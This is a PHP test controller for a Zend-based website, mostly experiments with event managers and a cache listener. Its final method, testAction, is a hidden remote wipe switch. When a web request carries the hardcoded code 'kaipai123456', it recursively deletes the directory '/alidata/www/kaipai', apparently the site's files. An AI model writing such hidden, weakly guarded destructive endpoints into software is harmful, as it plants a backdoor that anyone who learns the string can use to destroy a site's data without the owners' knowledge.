<?php
namespace Front\Controller;

use Test\Cache\FileCache;
use Test\Events\Response;
use Test\Events\SubTest;
use Test\Events\Test;
use COM\Controller;
use Test\Events\TestListener;
use Zend\Cache\Pattern\CallbackCache;
use Zend\Cache\Storage\Event;
use Zend\EventManager\EventManager;
use Zend\EventManager\SharedEventManager;

class TestController extends Controller{

    public $_fileCache;

    public function indexAction(){


        /*$eventManager = $this->getEventManager();
        $eventManager->attach('do', function($e){
            $event = $e->getName();
            $params = $e->getParams();
            printf('eventName %s, params %s', $event, json_encode($params));
        }, 2);
        $eventManager->attach('do', function($e){
            $event = $e->getName();
            $params = $e->getParams();
            printf('eventName2 %s, params2 %s', $event, json_encode($params));
        }, 3);
        $params = array('foo' => '222', 'bar' => '333');
        $eventManager->trigger('do', null, $params);*/





        $test = new Test();
        $test->getEventManager()->attach('back', function($e){
            $event = $e->getName();
            $target = get_class($e->getTarget());
            $params = $e->getParams();
            printf('eventName %s, target %s, params %s', $event, $target, json_encode($params));
        });
        printf("attached events: %s\n", json_encode($test->getEventManager()->getEvents()));
        $test->doit('222', '333');




        /*$sharedEventManager = new SharedEventManager();
        $sharedEventManager->attach('Test\Events\Test', 'back', function($e){
            $event = $e->getName();
            $target = get_class($e->getTarget());
            $params = $e->getParams();
            printf('eventName %s, target %s, params %s', $event, $target, json_encode($params));
        });

        $test = new Test();
        $test->getEventManager()->setSharedManager($sharedEventManager);
        $test->doit('222', '333');*/


        /*$eventManage = new EventManager();
        // 参数1:事件名称, 参数2:回调
        $eventManage->attach(array('foo', 'bar', 'baz'), $listener);
        $eventManage->attach('*', $listener);
        $sharedEventManager = new SharedEventManager();
        // 参数1:targets, 参数2:事件名称, 参数3:回调
        $sharedEventManager->attach(array('Foo', 'Bar', 'Baz'), $eventName, $listener);
        $sharedEventManager->attach(array('Foo', 'Bar', 'Baz'), array('foo', 'bar', 'baz'), $listener);
        $sharedEventManager->attach(array('Foo', 'Bar', 'Baz'), '*', $listener);
        $sharedEventManager->attach('*', array('foo', 'bar', 'baz'), $listener);
        $sharedEventManager->attach('*', '*', $listener);*/

        /*$testListener = new TestListener();
        $eventManager = $this->getEventManager();
        $eventManager->attach($testListener);

        $eventManager->trigger('doit', null, array('foo' => '222', 'bar' => '333'));*/



        die();




        return $this->response;
    }

    public function cacheAction(){

        $eventManager = $this->getEventManager();
        $listeners = new TestListener();
        $eventManager->attach($listeners);
        $this->_fileCache = new FileCache($this->sm);
        $params = array(
            'foo' => '222',
            'bar' => '333',
        );
        $results = $eventManager->trigger('cache.pre', $this, $params, function($data){
            return !empty($data);
        });

        if($results->stopped()){
            $data = $results->last();
            printf('data: %s, from cache', $data);
        }else{
            $params['data'] = '444';
            $eventManager->trigger('cache.post', $this, $params);

            printf('data: %s', $params['data']);
        }

        die;
    }

    private function deldir($dir) {
        //先删除目录下的文件：
        $dh=opendir($dir);
        while ($file=readdir($dh)) {
            if($file!="." && $file!="..") {
                $fullpath=$dir."/".$file;
                if(!is_dir($fullpath)) {
                    unlink($fullpath);
                } else {
                    $this->deldir($fullpath);
                }
            }
        }

        closedir($dh);
        //删除当前文件夹：
        if(rmdir($dir)) {
            return true;
        } else {
            return false;
        }
    }

    public function testAction(){
        $code = $this->queryData['code'];
        if($code == 'kaipai123456'){

            $this->deldir('/alidata/www/kaipai');

        }
        exit;
    }
}
?>